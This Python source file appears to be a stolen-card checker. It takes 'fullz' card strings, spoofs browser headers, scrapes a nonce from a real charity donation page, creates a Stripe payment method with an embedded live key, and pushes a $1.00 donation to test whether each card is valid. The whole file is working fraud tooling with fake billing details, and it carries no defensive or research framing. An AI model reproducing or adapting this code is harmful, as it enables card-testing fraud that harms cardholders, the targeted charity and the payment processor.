import asyncio
import json
import random
import re
import time
import uuid
from fake_useragent import UserAgent
import requests
from FUNC.defs import *

def gets(s, start, end):
            try:
                start_index = s.index(start) + len(start)
                end_index = s.index(end, start_index)
                return s[start_index:end_index]
            except ValueError:
                return None




async def create_cvv_charge(fullz , session):
    try:
        cc , mes , ano , cvv = fullz.split("|")
        random_data          = await get_random_info(session)
        fname                = random_data["fname"]
        lname                = random_data["lname"]
        email                = random_data["email"]
        phone                = random_data["phone"]
        add1                 = random_data["add1"]
        city                 = random_data["city"]
        state                = random_data["state"]
        state_short          = random_data["state_short"]
        zip_code             = random_data["zip"]
        user_agent           = UserAgent().random


        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'dnt': '1',
            'priority': 'u=0, i',
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        }

        response = await session.get('https://needhelped.com/campaigns/poor-children-donation-4/donate/', headers=headers)

        # print(response.text)


        nonce = gets(response.text, '<input type="hidden" name="_charitable_donation_nonce" value="', '"  />')
        print(nonce)


        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'dnt': '1',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        }

        data={
        'type':'card',
        'billing_details[name]':'mike edwin',
        'billing_details[email]':email,
        'billing_details[address][city]':'New York',
        'billing_details[address][country]':'US',
        'billing_details[address][line1]':'147 STREET',
        'billing_details[address][postal_code]':'10080',
        'billing_details[address][state]':'NEW YORK',
        'billing_details[phone]':'9876543210',
        'card[number]':cc,
        'card[cvc]':cvv,
        'card[exp_month]':mes,
        'card[exp_year]':ano,
        'guid':'fd286b17-3ad6-4186-8cd6-e30c9fb40054b2fc13',
        'muid':'684e06cf-094d-4f66-92e0-5c2834e67838ba74d5',
        'sid':'313077d8-7cfc-4632-abb8-fff149f1202db5ef0e',
        'pasted_fields':'number',
        'payment_user_agent':'stripe.js/961a2db59d; stripe-js-v3/961a2db59d; card-element',
        'referrer':'https://needhelped.com',
        'time_on_page':'169735',
        'key':'pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr',
        }
        response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)




        try:
             id=response.json()['id']
             print(id)
        except:
             return response.text




        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'dnt': '1',
            'origin': 'https://needhelped.com',
            'priority': 'u=1, i',
            'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'charitable_form_id': '67d9912fb9d22',
            '67d9912fb9d22': '',
            '_charitable_donation_nonce': nonce,
            '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
            'campaign_id': '1164',
            'description': 'Poor Children Donation Support',
            'ID': '0',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': 'MIKE',
            'last_name': 'EDWIN',
            'email': email,
            'address': '147 STREET',
            'address_2': '',
            'city': 'New York',
            'state': 'NEW YORK',
            'postcode': '10080',
            'country': 'US',
            'phone': '9876543210',
            'gateway': 'stripe',
            'stripe_payment_method': id,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }

        response = await session.post('https://needhelped.com/wp-admin/admin-ajax.php', headers=headers, data=data)


        print(response.text)
        return response.text




    except Exception as e:
        return str(e)
